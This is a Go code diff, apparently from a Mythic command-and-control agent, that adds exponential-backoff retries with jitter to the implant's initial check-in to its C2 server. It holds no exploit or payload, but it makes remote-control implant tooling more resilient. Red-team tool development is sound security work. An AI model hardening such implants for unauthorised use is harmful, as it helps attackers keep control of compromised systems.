@@ -226,13 +226,26 @@ func runAgent() {
 	// Initialize file transfer goroutines
 	files.Initialize()
 
-	// Initial checkin
+	// Initial checkin with exponential backoff retry
 	log.Printf("[INFO] Starting initial checkin...")
-	if err := c2.Checkin(agent); err != nil {
-		log.Printf("[ERROR] Initial checkin failed: %v", err)
-		return
+	for attempt := 0; attempt < maxRetriesInt; attempt++ {
+		if err := c2.Checkin(agent); err != nil {
+			log.Printf("[ERROR] Initial checkin attempt %d failed: %v", attempt+1, err)
+			backoffMultiplier := 1 << min(attempt, 8)
+			backoffSeconds := sleepIntervalInt * backoffMultiplier
+			if backoffSeconds > 300 {
+				backoffSeconds = 300
+			}
+			sleepTime := calculateSleepTime(backoffSeconds, jitterInt)
+			time.Sleep(sleepTime)
+			continue
+		}
+		log.Printf("[INFO] Initial checkin successful")
+		goto checkinDone
 	}
-	log.Printf("[INFO] Initial checkin successful")
+	log.Printf("[ERROR] All initial checkin attempts failed, exiting")
+	return
+checkinDone:
 
 	// After successful HTTP checkin, propagate the callback UUID to the TCP P2P instance.
 	// This ensures edge messages use the correct parent UUID for Mythic's P2P graph.
